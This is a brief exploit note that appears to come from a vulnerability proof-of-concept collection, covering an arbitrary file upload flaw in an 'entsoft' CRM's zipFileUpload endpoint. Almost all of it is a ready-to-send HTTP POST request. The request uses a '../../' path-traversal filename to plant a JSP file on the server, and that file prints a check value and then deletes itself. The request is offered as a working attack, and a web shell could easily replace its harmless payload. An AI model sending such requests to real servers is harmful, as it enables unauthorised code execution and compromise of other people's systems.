# entsoft_CrmBasicAction_fileupload

from: https://mp.weixin.qq.com/s/CZXiKWOoPT3MYg70al7NiQ
2024/1/22 @2 

```
POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Length: 267
Accept-Encoding: gzip
Connection: close
Content-Type: multipart/form-data; boundary=0rwysvgvy7rxv790mpju

--0rwysvgvy7rxv790mpju
Content-Disposition: form-data; name="file"; filename="../../mqh8qxe3cy.jsp"
Content-Type: application/zip

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--0rwysvgvy7rxv790mpju--

```
